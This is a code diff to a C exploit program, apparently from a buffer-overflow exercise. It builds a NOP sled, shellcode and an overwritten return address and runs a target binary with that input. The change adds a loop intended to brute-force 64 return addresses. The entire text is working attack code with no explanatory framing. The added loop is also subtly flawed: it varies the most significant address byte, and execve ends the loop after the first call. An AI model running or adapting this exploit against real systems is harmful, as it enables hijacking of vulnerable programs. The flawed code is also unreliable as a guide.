@@ -15,38 +15,49 @@ static char shellcode[] =
 const int OFFSET = 404;
 const int SHELLCODE_LENGTH = sizeof(shellcode) - 1;
 const int NOP_COUNT = OFFSET - SHELLCODE_LENGTH - 4;
-const char* RETURN_ADDRESS = "\x30\xd3\xff\xff";  // 0xffffd330
+const char* RETURN_ADDRESS_BASE = "\x30\xd3\xff\xff";  // 0xffffd330
 
 int main(void)
 {
   char *args[3];
   char *env[1];
 
-  // Create the exploit string
-  char buf[OFFSET + 1];
-  memset(buf, 0, sizeof(buf));
+  // Iterate over a range of return addresses
+  for (int i = 0; i < 64; i++) {
+    // Create the exploit string
+    char buf[OFFSET + 1];
+    memset(buf, 0, sizeof(buf));
 
-  // Add the NOP sled
-  memset(buf, '\x90', NOP_COUNT);
+    // Add the NOP sled
+    memset(buf, '\x90', NOP_COUNT);
 
-  // Add the shellcode
-  memcpy(buf + NOP_COUNT, shellcode, SHELLCODE_LENGTH);
+    // Add the shellcode
+    memcpy(buf + NOP_COUNT, shellcode, SHELLCODE_LENGTH);
 
-  // Add the return address
-  memcpy(buf + NOP_COUNT + SHELLCODE_LENGTH, RETURN_ADDRESS, 4);
+    // Calculate the return address with the current offset
+    char return_address[4];
+    return_address[0] = RETURN_ADDRESS_BASE[0];
+    return_address[1] = RETURN_ADDRESS_BASE[1];
+    return_address[2] = RETURN_ADDRESS_BASE[2];
+    return_address[3] = RETURN_ADDRESS_BASE[3] + i;
 
-  // Null-terminate the exploit string
-  buf[OFFSET] = '\0';
+    // Add the return address
+    memcpy(buf + NOP_COUNT + SHELLCODE_LENGTH, return_address, 4);
 
-  // Set up the arguments for execve
-  args[0] = TARGET;
-  args[1] = buf;
-  args[2] = NULL;
+    // Null-terminate the exploit string
+    buf[OFFSET] = '\0';
 
-  env[0] = NULL;
+    // Set up the arguments for execve
+    args[0] = TARGET;
+    args[1] = buf;
+    args[2] = NULL;
 
-  // Execute the target program with the exploit string
-  execve(TARGET, args, env);
+    env[0] = NULL;
+
+    // Execute the target program with the exploit string
+    execve(TARGET, args, env);
+  }
+
   fprintf(stderr, "execve failed.\n");
 
   return 0;
